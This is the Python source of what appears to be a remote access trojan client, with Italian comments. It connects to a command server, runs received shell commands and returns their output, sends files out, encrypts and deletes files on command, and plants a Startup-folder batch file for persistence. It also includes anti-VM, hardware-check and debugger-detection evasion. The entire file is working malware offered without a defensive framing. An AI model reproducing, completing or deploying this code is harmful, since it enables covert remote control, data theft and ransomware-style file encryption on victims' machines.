import socket
import subprocess
import os
import sys
from colorama import Fore
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2
import time
import psutil
import platform
import ctypes
import threading

blacklist_keywords = [
    'virtualbox',
    'enterprise',
    'vmware'
]

def wait_for_internet_connection():
    while True:
        try:
            # Tenta di risolvere un indirizzo DNS per verificare la connessione
            socket.gethostbyname("www.google.com")
            print("Connection Intercepted.")
            return
        except socket.gaierror:
            print("Internet Connection not found. Waiting...")
            time.sleep(5)  # Attendi 5 secondi prima di riprovare

def no_vm():
    os_name = platform.system().lower()
    
    domain_name = os.environ.get('USERDOMAIN', '').lower()
    
    machine_name = platform.node().lower()
    
    for keyword in blacklist_keywords:
        if keyword in domain_name or keyword in machine_name or keyword in os_name:
            return True
    
    return False

def is_vm():
    vm_indicators = [
        'virtualbox',
        'vbox',
        'vmware',
        'qemu',
        'xen',
        'hyper-v'
    ]
    
    try:
        output = subprocess.check_output("wmic baseboard get manufacturer", shell=True).decode()
        for indicator in vm_indicators:
            if indicator in output.lower():
                return True
            else:
                return False
    except Exception as e:
        return False

def generate_key_from_password(password):
    salt = b'\x00' * 16  # Per semplicità, usa un salt fisso. In produzione, genera un salt casuale e memorizzalo con la chiave.
    key = PBKDF2(password, salt, dkLen=32, count=1000000)
    return key

def encrypt_file(file_path, password):
    key = generate_key_from_password(password)
    cipher = AES.new(key, AES.MODE_EAX)
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    with open(file_path + ".enc", 'wb') as f:
        [f.write(x) for x in (cipher.nonce, tag, ciphertext)]
    os.remove(file_path)

def decrypt_file(file_path, password):
    key = generate_key_from_password(password)
    with open(file_path, 'rb') as f:
        nonce, tag, ciphertext = [f.read(x) for x in (16, 16, -1)]
    cipher = AES.new(key, AES.MODE_EAX, nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    with open(file_path[:-4], 'wb') as f:
        f.write(plaintext)
    os.remove(file_path)

def specsCheck():
    ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
    if int(ram) <= 3:  # 3GB o meno di RAM
        sys.programExit()
    disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
    if int(disk) <= 50:  # 50GB o meno di spazio su disco
        sys.programExit()
    if int(psutil.cpu_count()) <= 1:  # 1 o meno core CPU
        sys.programExit()

def tiny_debugger_protection():
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

def make_persistent():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    batch_file_path = os.path.join(startup_folder, 'client_persistence.bat')
    
    with open(batch_file_path, 'w') as batch_file:
        batch_file.write(f"@echo off\npythonw.exe -u {os.path.abspath(sys.argv[0])}\nexit\n")
    print(f"File created.")

def upload_file(client_socket, filename):
    try:
        with open(filename, 'rb') as file:
            while True:
                data = file.read(1024)
                if not data:
                    break
                client_socket.sendall(data)
        print(f"File {filename} inviato con successo.")
    except FileNotFoundError:
        print(f"File {filename} non trovato.")
        client_socket.send(b'')  # Invia un segnale vuoto al server se il file non esiste
    except Exception as e:
        print(f"Errore nell'invio del file: {e}")
        client_socket.send(b'')  # Invia un segnale vuoto al server in caso di errore

def connect_to_server(server_ip, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))
    
    current_directory = os.getcwd()  # Mantiene la directory corrente

    while True:
        try:
            # Riceve il comando dal server
            command = client_socket.recv(1024).decode('utf-8')
            
            if command.lower() == 'exit':
                break
            
            elif command.lower() == 'persistence':
                response = (Fore.YELLOW + "[!] Attemping to inject BAT code...\n[+] BAT code injected." + Fore.WHITE + " ")
                make_persistent()
                client_socket.send(response.encode('utf-8'))
                continue
                
            elif command.startswith("encrypt "):
                try:
                    _, file_path, password = command.split(' ')
                    encrypt_file(file_path, password)
                    output = f"File '{file_path}' encrypted."
                    client_socket.send(output.encode('utf-8'))
                except Exception as e:
                    output = str(e)
                    client_socket.send(output.encode('utf-8'))
                continue

            elif command.startswith("decrypt "):
                try:
                    _, file_path, password = command.split(' ')
                    decrypt_file(file_path, password)
                    output = f"File '{file_path}' decrypted."
                    client_socket.send(output.encode('utf-8'))
                except Exception as e:
                    output = str(e)
                    client_socket.send(output.encode('utf-8'))
                continue
            
            elif command.startswith("download"):
                filename = command.split(" ", 1)[1]
                # Crea un thread per caricare il file senza bloccare l'esecuzione del programma
                threading.Thread(target=upload_file, args=(client_socket, filename)).start()
                continue

            # Gestisci il comando 'cd' separatamente
            if command.startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    current_directory = os.getcwd()
                    output = f"Directory changed to {current_directory}"
                except FileNotFoundError:
                    output = f"Directory not found: {path}"
                except Exception as e:
                    output = str(e)
            else:
                # Esegui altri comandi nella directory corrente
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True, cwd=current_directory)
                except subprocess.CalledProcessError as e:
                    output = str(e.output)

            # Invia l'output al server
            client_socket.send(output.encode('utf-8'))
        
        except Exception as e:
            print(f"Errore: {e}")
            client_socket.close()
            break
    
    client_socket.close()

if __name__ == "__main__":
    SERVER_IP = '127.0.0.1'  # IP del server
    SERVER_PORT = 54000      # Porta del server
    no_vm()
    specsCheck()    
    wait_for_internet_connection()
    connect_to_server(SERVER_IP, SERVER_PORT)
